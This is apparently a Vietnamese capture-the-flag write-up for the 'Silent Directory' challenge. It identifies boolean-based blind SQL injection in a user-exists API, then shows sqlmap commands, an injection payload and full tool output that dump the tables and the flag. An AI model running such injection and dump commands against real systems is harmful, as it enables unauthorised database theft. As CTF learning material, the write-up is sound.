# Silent Directory

## ANALYZE

<figure><img src="../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

dựa theo mô tả của bài thì ta biết được trang web này có tồn tại 1 api có thể check xem người dùng này có tồn tại không , dựa vào đó ta có thể biết chắc chắn nó phải truy vấn vào database và chỉ đưa ra output dạng yes/no thì 63% là blind sql và vì đây là 1 chall CTF thì chắc chắn no là sqli roi =))



<figure><img src="../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

Dựa vào hint này ta có thể chắc chắn 100% là SQLI blind dạng Boolean

Ta hoàn toàn có thể dùng sqlmap để khai thác nhanh :&#x20;

```bash
sqlmap -u "http://gateway.sanchoi.iahn.hanoi.vn:30038/api/user-exists?u=alice" -p u --cookie="FCTF_Auth_Token=eyJleHAiOjE3NzYwMDkzODMsInJvdXRlIjoidGVhbS0xMi0xNC1zaWxlbnQtZGlyZWN0b3J5LTE3NzYwMDc1NzUifQ.lSI4ju5H4pZz8UgJC94mO8jM7L4UJAHTwGfIaOjp9IE" 
--batch --technique=B --dbms=SQLite --tables
```

```bash
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.10.3#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:48:45 /2026-04-12/

[11:48:47] [INFO] testing connection to the target URL
[11:48:47] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:48:47] [INFO] testing if the target URL content is stable
[11:48:47] [INFO] target URL content is stable
[11:48:47] [WARNING] heuristic (basic) test shows that GET parameter 'u' might not be injectable
[11:48:47] [INFO] testing for SQL injection on GET parameter 'u'
[11:48:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:48:47] [INFO] GET parameter 'u' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[11:48:47] [INFO] checking if the injection point on GET parameter 'u' is a false positive
GET parameter 'u' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 13 HTTP(s) requests:
---
Parameter: u (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: u=alice' AND 1936=1936 AND 'FHOM'='FHOM
---
[11:48:48] [INFO] testing SQLite
[11:48:48] [INFO] confirming SQLite
[11:48:48] [INFO] actively fingerprinting SQLite
[11:48:48] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[11:48:48] [INFO] fetching tables for database: 'SQLite_masterdb'
[11:48:48] [INFO] fetching number of tables for database 'SQLite_masterdb'
[11:48:48] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:48:48] [INFO] retrieved: 2
[11:48:48] [INFO] retrieved: users
[11:48:48] [INFO] retrieved: secrets
<current>
[2 tables]
+---------+
| secrets |
| users   |
+---------+

[11:48:49] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/gateway.sanchoi.iahn.hanoi.vn'

[*] ending @ 11:48:49 /2026-04-12/
```

Dựa vào đây ta xác định được là có 2 bảng là secrets và users

## EXPLOIT

Ta sẽ thêm cờ `--dump` để lấy data từ 2 bảng bên trên

```bash
       __H__
 ___ ___[']_____ ___ ___  {1.10.3#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:49:59 /2026-04-12/

[11:49:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: u (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: u=alice' AND 1936=1936 AND 'FHOM'='FHOM
---
[11:49:59] [INFO] testing SQLite
[11:49:59] [INFO] confirming SQLite
[11:49:59] [INFO] actively fingerprinting SQLite
[11:49:59] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[11:49:59] [INFO] fetching tables for database: 'SQLite_masterdb'
[11:49:59] [INFO] fetching number of tables for database 'SQLite_masterdb'
[11:49:59] [INFO] resumed: 2
[11:49:59] [INFO] resumed: users
[11:49:59] [INFO] resumed: secrets
<current>
[2 tables]
+---------+
| secrets |
| users   |
+---------+

[11:49:59] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:49:59] [INFO] retrieved: CREATE TABLE secrets (                 id INTEGER PRIMARY KEY,                 flag TEXT NOT NULL             )
[11:50:11] [INFO] fetching entries for table 'secrets'
[11:50:11] [INFO] fetching number of entries for table 'secrets' in database 'SQLite_masterdb'
[11:50:11] [INFO] retrieved: 1
[11:50:11] [INFO] retrieved: FCTF{blind_boolean_bit_by_bit}
[11:50:14] [INFO] retrieved: 1
Database: <current>
Table: secrets
[1 entry]
+----+--------------------------------+
| id | flag                           |
+----+--------------------------------+
| 1  | FCTF{blind_boolean_bit_by_bit} |
+----+--------------------------------+

[11:50:14] [INFO] table 'SQLite_masterdb.secrets' dumped to CSV file '/home/kali/.local/share/sqlmap/output/gateway.sanchoi.iahn.hanoi.vn/dump/SQLite_masterdb/secrets.csv'
[11:50:14] [INFO] retrieved: CREATE TABLE users (                 id INTEGER PRIMARY KEY,                 username TEXT NOT NULL UNIQUE             )
[11:50:26] [INFO] fetching entries for table 'users'
[11:50:26] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[11:50:26] [INFO] retrieved: 3
[11:50:26] [INFO] retrieved: 1
[11:50:26] [INFO] retrieved: alice
[11:50:27] [INFO] retrieved: 2
[11:50:27] [INFO] retrieved: bob
[11:50:27] [INFO] retrieved: 3
[11:50:27] [INFO] retrieved: charlie
Database: <current>
Table: users
[3 entries]
+----+----------+
| id | username |
+----+----------+
| 1  | alice    |
| 2  | bob      |
| 3  | charlie  |
+----+----------+

[11:50:28] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/gateway.sanchoi.iahn.hanoi.vn/dump/SQLite_masterdb/users.csv'
```



## FLAG

```
FCTF{blind_boolean_bit_by_bit}
```





